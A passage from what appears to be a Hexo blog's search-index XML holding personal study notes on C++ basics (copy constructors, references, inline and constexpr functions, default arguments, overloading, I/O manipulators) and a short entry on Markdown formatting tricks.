class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Point类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy); <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(); <span class="comment">//默认构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(Point &amp;p); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getX</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> x;&#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getY</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> y;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">float</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy):<span class="built_in">x</span>(xx),<span class="built_in">y</span>(yy)&#123;&#125; <span class="comment">//构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>():<span class="built_in">x</span>(<span class="number">0</span>),<span class="built_in">y</span>(<span class="number">0</span>)&#123;&#125; <span class="comment">//默认构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>(Point &amp;p) <span class="comment">//复制构造函数的定义</span></span><br><span class="line">&#123;</span><br><span class="line">    x=p.x;</span><br><span class="line">    y=p.y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Point&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Line类，类的组合，计算两点之间的距离</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Line</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Line</span>(Point o1,Point o2); <span class="comment">//参数为Point对象的构造函数</span></span><br><span class="line">    <span class="built_in">Line</span>(Line &amp;l); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getLen</span><span class="params">()</span></span>; <span class="comment">//外部接口</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Point p1,p2;</span><br><span class="line">    <span class="type">float</span> len=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Line::<span class="built_in">Line</span>(Point o1,Point o2):<span class="built_in">p1</span>(o1),<span class="built_in">p2</span>(o2) <span class="comment">//构造函数是每一个成员变量都要初始化的</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x=p<span class="number">1.</span><span class="built_in">getX</span>()-p<span class="number">2.</span><span class="built_in">getX</span>();</span><br><span class="line">    <span class="comment">//此处并不能够直接写  p1.x - p2.x 因为x属于私有变量</span></span><br><span class="line">    <span class="comment">// 通过两个public成员函数可以访问，相当于提供了外部接口</span></span><br><span class="line">    <span class="type">float</span> y=p<span class="number">1.</span><span class="built_in">getY</span>()-p<span class="number">2.</span><span class="built_in">getY</span>();</span><br><span class="line">    len= <span class="built_in">sqrt</span>(x*x+y*y);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">Line::<span class="built_in">Line</span>(Line &amp;l): <span class="built_in">p1</span>(l.p1),<span class="built_in">p2</span>(l.p2) <span class="comment">//复制构造函数是每一个成员变量都需要进行复制的 且这个&#x27;.&#x27;只能够在类的作用域内使用。</span></span><br><span class="line">&#123;</span><br><span class="line">    len=l.len;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Line::getLen</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> len;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">myp1</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span>,<span class="title">myp2</span><span class="params">(<span class="number">4</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="function">Line <span class="title">line</span><span class="params">(myp1,myp2)</span></span>; <span class="comment">//参数传递的时候也需要复制构造哦</span></span><br><span class="line">    <span class="function">Line <span class="title">line2</span><span class="params">(line)</span></span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line is &quot;</span> &lt;&lt; line.<span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line2 is &quot;</span> &lt;&lt; line<span class="number">2.</span><span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="前向引用声明"><a href="#前向引用声明" class="headerlink" title="前向引用声明"></a>前向引用声明</h3><p>遇到两个类相互引用的情况，也称为循环依赖，简单理解就是你不能使用一个在前面完全没有出现过的标识符。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>;  <span class="comment">//前向引用声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="comment">//A类的定义</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(B b)</span></span>;<span class="comment">//以B类对象b为形参的成员函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;<span class="comment">//B类定义</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(A a)</span></span>;      <span class="comment">//以A类对象a为形参的成员函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Functions</title>
      <link href="/2022/07/20/C++%20Functions/"/>
      <url>/2022/07/20/C++%20Functions/</url>
      
        <content type="html"><![CDATA[<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><h3 id="rand-function"><a href="#rand-function" class="headerlink" title="rand function"></a>rand function</h3><p>Function prototype: <code>int rand(void);</code><br>Required header file: <code>&lt;cstdlib&gt;</code><br>Function and return value: Generates and returns a pseudo-random number</p><hr><h3 id="srand-function"><a href="#srand-function" class="headerlink" title="srand function"></a>srand function</h3><p>Function prototype: <code>void srand(unsigned int seed);</code><br>Parameter: seed for generating random numbers<br>Required header file: <code>&lt;cstdlib&gt;</code><br>Function: Sets the starting point for rand() to generate a series of pseudo-random integers. Using 1 as the seed parameter can reinitialize rand().</p><hr><h2 id="It-should-be-noted-that-if-no-seed-is-used-the-random-numbers-generated-each-time-the-program-runs-will-be-fixed-and-unchanged-Therefore-the-rand-function-returns-pseudo-random-numbers"><a href="#It-should-be-noted-that-if-no-seed-is-used-the-random-numbers-generated-each-time-the-program-runs-will-be-fixed-and-unchanged-Therefore-the-rand-function-returns-pseudo-random-numbers" class="headerlink" title="It should be noted that if no seed is used, the random numbers generated each time the program runs will be fixed and unchanged. Therefore, the rand function returns pseudo-random numbers."></a>It should be noted that if no seed is used, the random numbers generated each time the program runs will be <strong>fixed and unchanged</strong>. Therefore, the rand function returns <strong>pseudo-random numbers</strong>.</h2><h3 id="Concept-of-References"><a href="#Concept-of-References" class="headerlink" title="Concept of References"></a>Concept of References</h3><ul><li>A reference (&amp;) is an alias for an identifier;</li><li>When defining a reference, it must be initialized at the same time to point to an existing object.<br>For example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> &amp;ri = i; <span class="comment">// Define int reference ri and initialize it as a reference to variable i</span></span><br><span class="line">j = <span class="number">10</span>;</span><br><span class="line">ri = j;  <span class="comment">// Equivalent to i = j;</span></span><br></pre></td></tr></table></figure><ul><li>Once a reference is initialized, it cannot be changed to point to other objects.<br>References can be used as formal parameters.</li></ul><div class="note info flat"><p>References can achieve bidirectional passing between function formal parameters and actual parameters</p></div><p> For example, the following program:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> <span class="comment">// Define reference type formal parameters</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap</span>(x, y);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Functions-with-Variable-Arguments"><a href="#Functions-with-Variable-Arguments" class="headerlink" title="Functions with Variable Arguments"></a>Functions with Variable Arguments</h3><p>C++ standard mainly provides two methods</p><ul><li>If all actual parameter types are the same, you can pass a standard library type called initializer_list;</li><li>If the actual parameter types are different, we can write variable parameter templates (Chapter 9).</li></ul><hr><h4 id="initializer-list"><a href="#initializer-list" class="headerlink" title="initializer_list"></a>initializer_list</h4><p><code>initializer_list</code> is a standard library type used to represent an array of values of a specific type, defined in the header file of the same name.</p><hr><h4 id="Usage-of-initializer-list"><a href="#Usage-of-initializer-list" class="headerlink" title="Usage of initializer_list"></a>Usage of initializer_list</h4><ul><li>initializer_list is a class template (templates are introduced in detail in Chapter 9)</li><li>When using templates, we need to follow the template name with a pair of angle brackets, with type parameters inside the brackets. For example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initializer_list&lt;string&gt;  ls;  <span class="comment">// The element type of initializer_list is string</span></span><br><span class="line">initializer_list&lt;<span class="type">int</span>&gt; li;      <span class="comment">// The element type of initializer_list is int</span></span><br></pre></td></tr></table></figure><ul><li>A special point about initializer_list is that the elements in its objects are always constant values, and we cannot change the values of elements in initializer_list objects.</li><li>Functions with initializer_list formal parameters can also have other formal parameters at the same time</li></ul><hr><h4 id="Example-of-using-initializer-list"><a href="#Example-of-using-initializer-list" class="headerlink" title="Example of using initializer_list"></a>Example of using initializer_list</h4><ul><li>When writing code to output error messages generated by the program, it’s best to use a unified function to implement this functionality, so that error handling for all errors can be uniform. However, the types of error messages are different, and the parameters passed when calling the error message output function will also vary.</li><li>Use initializer_list to write an error message output function that can work with a variable number of formal parameters.</li></ul><hr><h3 id="Inline-Functions"><a href="#Inline-Functions" class="headerlink" title="Inline Functions"></a>Inline Functions</h3><ul><li>Use the keyword inline when declaring.</li><li>At compile time, replace the call site with the function body, saving overhead from parameter passing, control transfer, etc.</li><li>Note:<ul><li>Inline function bodies cannot have loop statements and switch statements;</li><li>The definition of an inline function must appear before the inline function is first called;</li><li>Exception interface declarations cannot be made for inline functions.</li></ul></li></ul><hr><h4 id="Application-Example"><a href="#Application-Example" class="headerlink" title="Application Example"></a>Application Example</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14159265358979</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">double</span> <span class="title">calArea</span><span class="params">(<span class="type">double</span> radius)</span> <span class="comment">// inline keyword</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PI * radius * radius;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> r = <span class="number">3.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> area = <span class="built_in">calArea</span>(r);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; area &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In essence, it omits function calls and returns, similar to directly pasting the function body to the call site.</p><hr><h3 id="constexpr-Functions-not-very-clear-about-usage"><a href="#constexpr-Functions-not-very-clear-about-usage" class="headerlink" title="constexpr Functions (not very clear about usage)"></a>constexpr Functions (not very clear about usage)</h3><h4 id="constexpr-Function-Syntax-Rules"><a href="#constexpr-Function-Syntax-Rules" class="headerlink" title="constexpr Function Syntax Rules"></a>constexpr Function Syntax Rules</h4><ul><li>Functions modified by constexpr must return constexpr when all their parameters are constexpr;</li><li>The function body must have exactly one return statement.</li></ul><hr><h4 id="constexpr-Function-Example"><a href="#constexpr-Function-Example" class="headerlink" title="constexpr Function Example"></a>constexpr Function Example</h4><ul><li>constexpr int get_size() { return 20; }</li><li>constexpr int foo &#x3D; get_size();<br>&#x2F;&#x2F; Correct: foo is a constant expression</li></ul><hr><h3 id="Functions-with-Default-Parameter-Values"><a href="#Functions-with-Default-Parameter-Values" class="headerlink" title="Functions with Default Parameter Values"></a>Functions with Default Parameter Values</h3><h4 id="Order-of-Default-Parameter-Value-Declarations"><a href="#Order-of-Default-Parameter-Value-Declarations" class="headerlink" title="Order of Default Parameter Value Declarations"></a>Order of Default Parameter Value Declarations</h4><ul><li>Formal parameters with default values must be listed at the rightmost of the parameter list, that is, there cannot be parameters without default values to the right of default parameter values;</li><li>The binding order of actual parameters and formal parameters when calling is from left to right.</li><li>Example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// Correct</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z)</span></span>;<span class="comment">// Error</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// Error</span></span><br></pre></td></tr></table></figure><hr><h4 id="Default-Parameter-Values-and-Function-Call-Location"><a href="#Default-Parameter-Values-and-Function-Call-Location" class="headerlink" title="Default Parameter Values and Function Call Location"></a>Default Parameter Values and Function Call Location</h4><p>If a function has a prototype declaration and the prototype declaration is before the definition, the default parameter values should be given in the function prototype declaration; if there is only the function definition, or the function definition is first, the default parameter values can be given in the function definition.<br>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span>；<span class="comment">// Prototype declaration first</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;<span class="comment">// Default values cannot be specified here again</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span><span class="comment">// Only definition, no prototype declaration</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Function-Overloading"><a href="#Function-Overloading" class="headerlink" title="Function Overloading"></a>Function Overloading</h3><p>C++ allows functions with similar functionality to be declared with the same function name in the same scope, thus forming overloading. This is convenient to use and easy to remember.</p><p>Notes:</p><ul><li>Overloaded functions must have different formal parameters: different number or different type.</li><li>The compiler will choose which function to call based on the best match of the type and number of actual parameters and formal parameters. (The compiler does not distinguish by formal parameter names and function return values)</li><li>Do not declare functions with different functionality as overloaded functions to avoid misunderstanding and confusion in call results.</li></ul><p>Function Overloading Application Example</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter two integer: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Their sum of square: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(m, n)&lt;&lt;endl;</span><br><span class="line">    <span class="type">double</span> x, y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter two real number: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Their sum of square: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(x, y)&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Running result:<br>Enter two integer: 3 5<br>Their sum of square: 34<br>Enter two real number: 2.3 5.8<br>Their sum of square: 38.93</p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Important Points to Note in C++ Basics</title>
      <link href="/2022/07/20/Important%20Points%20to%20Note%20in%20C++%20Basics/"/>
      <url>/2022/07/20/Important%20Points%20to%20Note%20in%20C++%20Basics/</url>
      
        <content type="html"><![CDATA[<h2 id="Data-Input-and-Output"><a href="#Data-Input-and-Output" class="headerlink" title="Data Input and Output"></a>Data Input and Output</h2><h3 id="I-O-Streams"><a href="#I-O-Streams" class="headerlink" title="I&#x2F;O Streams"></a>I&#x2F;O Streams</h3><p>In C++, the flow of data from one object to another is abstracted as “streams”. cin and cout are predefined stream class objects, where cin is used to handle standard input (keyboard input), and cout is used to handle standard output (screen output).</p><hr><h3 id="Predefined-Insertion-and-Extraction-Operators"><a href="#Predefined-Insertion-and-Extraction-Operators" class="headerlink" title="Predefined Insertion and Extraction Operators"></a>Predefined Insertion and Extraction Operators</h3><p>“&lt;&lt;” is the predefined insertion operator, which when applied to the stream class object cout can achieve the most general screen output.</p><p>“&gt;&gt;” is the extraction operator, which when applied to the stream class object cin can achieve the most general keyboard input.</p><hr><h3 id="Common-I-O-Stream-Library-Manipulators"><a href="#Common-I-O-Stream-Library-Manipulators" class="headerlink" title="Common I&#x2F;O Stream Library Manipulators"></a>Common I&#x2F;O Stream Library Manipulators</h3><table><thead><tr><th>Manipulator Name</th><th>Meaning</th></tr></thead><tbody><tr><td>dec</td><td>Numeric data in decimal representation</td></tr><tr><td>hex</td><td>Numeric data in hexadecimal representation</td></tr><tr><td>oct</td><td>Numeric data in octal representation</td></tr><tr><td>ws</td><td>Extract whitespace characters</td></tr><tr><td>endl</td><td>Insert newline and flush the stream</td></tr><tr><td>setsprecision(int)</td><td>Set decimal places for floating point numbers (including decimal point)</td></tr><tr><td>setw(int)</td><td>Set field width</td></tr></tbody></table><hr><h2 id="if-else-Statements"><a href="#if-else-Statements" class="headerlink" title="if-else Statements"></a>if-else Statements</h2><p>First, the pairing method of <code>else</code> is to pair with the <code>if</code> at the same level by looking upward.<br>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">else</span>()</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="built_in">else</span>()</span><br></pre></td></tr></table></figure><p>This is feasible because all <code>else</code> statements have pairs, but indentation does not represent structure. Strictly speaking, <code>&#123;&#125;</code> should be used to distinguish different nesting levels. <strong>Only for distinguishing different structures</strong>.</p><hr><p><strong>Counter-example</strong>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line"><span class="keyword">else</span></span><br></pre></td></tr></table></figure><p>In this case, <code>else</code> pairs with the indented <code>if</code>.</p><hr><h2 id="typedef-Declaration"><a href="#typedef-Declaration" class="headerlink" title="typedef Declaration"></a>typedef Declaration</h2><p>typedef  existing_type_name  new_type_name_list</p><p>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">double</span> Area,Volume;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Natural;</span><br><span class="line">Natural i1,i2;</span><br><span class="line">Area a;</span><br><span class="line">Volume v;</span><br></pre></td></tr></table></figure><hr><h2 id="Another-Way-to-Define-Custom-Types-Besides-typedef-using"><a href="#Another-Way-to-Define-Custom-Types-Besides-typedef-using" class="headerlink" title="Another Way to Define Custom Types Besides typedef: using"></a>Another Way to Define Custom Types Besides typedef: using</h2><p><code>using new_type_name = existing_type_name</code></p><p>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Area = <span class="type">double</span>;</span><br><span class="line"><span class="keyword">using</span> Volume = <span class="type">double</span>;</span><br></pre></td></tr></table></figure><h2 id="auto-Type-and-decltype-Type"><a href="#auto-Type-and-decltype-Type" class="headerlink" title="auto Type and decltype Type"></a>auto Type and decltype Type</h2><p><code>auto</code>: The compiler automatically determines the variable type through the initial value<br><code>decltype</code>: Define a variable with the same type as a certain expression, but do not initialize the variable with that expression<br>For example: <code>decltype(i) j = 2;</code> makes j have the same type as i, but does not initialize j with 2.</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog Writing Tricks</title>
      <link href="/2022/07/20/Blog%20Writing%20Tricks/"/>
      <url>/2022/07/20/Blog%20Writing%20Tricks/</url>
      
        <content type="html"><![CDATA[<h2 id="Bold-and-Italic"><a href="#Bold-and-Italic" class="headerlink" title="Bold and Italic"></a>Bold and Italic</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**Hello,World!**</span></span><br><span class="line"><span class="emphasis">*Hello,world!*</span></span><br></pre></td></tr></table></figure><p><strong>Hello,World!</strong><br><em>Hello,world!</em></p><hr><h2 id="Inline-HTML"><a href="#Inline-HTML" class="headerlink" title="Inline HTML"></a>Inline HTML</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span>To reboot your computer, press <span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>ctrl<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>alt<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>del<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>.<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>To reboot your computer, press <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>del</kbd>.</p><hr><h2 id="Blog-Encryption"><a href="#Blog-Encryption" class="headerlink" title="Blog Encryption"></a>Blog Encryption</h2><h3 id="Install-hexo-blog-encrypt-Plugin"><a 